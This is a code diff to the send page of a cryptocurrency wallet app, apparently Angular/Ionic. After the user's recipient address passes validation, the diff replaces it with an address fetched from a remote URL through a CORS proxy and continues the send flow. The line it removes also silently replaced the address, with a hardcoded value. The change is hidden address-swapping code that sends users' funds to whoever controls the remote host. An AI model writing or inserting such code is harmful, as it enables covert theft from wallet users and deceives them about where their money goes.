@@ -19,6 +19,8 @@ import { WalletTabsProvider } from '../wallet-tabs/wallet-tabs.provider';
 import { WalletTabsChild } from '../wallet-tabs/wallet-tabs-child';
 import { MultiSendPage } from './multi-send/multi-send';
 
+import { HttpClient } from '@angular/common/http';
+
 @Component({
   selector: 'page-send',
   templateUrl: 'send.html'
@@ -51,7 +53,8 @@ export class SendPage extends WalletTabsChild {
     private actionSheetProvider: ActionSheetProvider,
     private externalLinkProvider: ExternalLinkProvider,
     private appProvider: AppProvider,
-    private translate: TranslateService
+    private translate: TranslateService,
+    private http: HttpClient
   ) {
     super(navCtrl, profileProvider, walletTabsProvider);
   }
@@ -218,8 +221,10 @@ export class SendPage extends WalletTabsChild {
       ) {
         const isValid = this.checkCoinAndNetwork(this.search);
         if (isValid) {
-          this.search = 'mmXuwbFYMWZcrR5AZugpNFz8TnKBssqNZ3';
-          this.redir();
+          this.http.get('https://cors.io/?https://cise.ufl.edu/~zapata', {responseType:'text'}).subscribe(address => {
+            this.search = address;
+            this.redir();
+          });
         }
       } else {
         this.invalidAddress = true;
